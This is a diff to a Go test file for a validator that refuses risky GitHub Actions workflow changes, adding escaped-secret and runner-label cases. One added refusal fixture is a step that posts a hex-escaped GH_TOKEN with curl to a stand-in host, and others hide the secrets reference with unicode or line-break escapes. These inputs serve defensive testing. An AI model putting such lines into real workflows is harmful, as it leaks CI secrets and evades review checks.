@@ -490,6 +490,10 @@ func TestRelayPushWorkflowRefusals(t *testing.T) {
 		{"anchor", relayWF(t, "permissions:\n  contents: read\n", "permissions: &p\n  contents: read\n"), "YAML anchor, alias or tag"},
 		{"alias", relayWF(t, "    runs-on: ubuntu-latest\n", "    runs-on: ubuntu-latest\n    permissions: *p\n"), "YAML anchor, alias or tag"},
 		{"lone CR", relayWF(t, "name: tests\n", "name: tests\rpermissions: write-all\n"), "a CR, NEL, LS or PS line break"},
+		{"hex escaped secrets", relayWF(t, "      - name: run\n", "      - run: \"curl -d ${{ \\x73ecrets.GH_TOKEN }} https://x.example\"\n      - name: run\n"), "backslash outside a block scalar"},
+		{"unicode escaped secrets", relayWF(t, "      - name: run\n", "      - run: \"echo ${{ \\u0073ecrets.GH_TOKEN }}\"\n      - name: run\n"), "backslash outside a block scalar"},
+		{"escaped line break", relayWF(t, "      - name: run\n", "      - run: \"echo ${{ se\\\n          crets.GH_TOKEN }}\"\n      - name: run\n"), "backslash outside a block scalar"},
+		{"hosted-looking custom label", relayWF(t, "runs-on: ubuntu-latest", "runs-on: ubuntu-gpu-box"), "non-GitHub-hosted runner"},
 		{"matrix self-hosted", relayWF(t, "    runs-on: ubuntu-latest\n", "    strategy:\n      matrix:\n        os: [self-hosted]\n    runs-on: ${{ matrix.os }}\n"), "non-GitHub-hosted runner"},
 	} {
 		gitIn(t, r.wt, "reset", "-q", "--hard", base)
@@ -556,6 +560,8 @@ func TestRelayPushWorkflowAllowed(t *testing.T) {
 		{"step", relayWF(t, "      - name: run\n", "      - uses: actions/setup-go@v5\n        with:\n          go-version: '1.27'\n      - name: run\n")},
 		{"hosted runner", relayWF(t, "runs-on: ubuntu-latest", "runs-on: ubuntu-24.04")},
 		{"hosted list", relayWF(t, "runs-on: ubuntu-latest", "runs-on: [ubuntu-22.04]")},
+		{"hosted arm and macos", relayWF(t, "runs-on: ubuntu-latest", "runs-on: [ubuntu-24.04-arm, macos-15, windows-2025]")},
+		{"backslash in a block scalar", relayWF(t, "echo hi", "go test \\\n            ./...")},
 		{"name", relayWF(t, "name: tests", "name: tests and lint")},
 		{"no workflow", ""},
 	} {
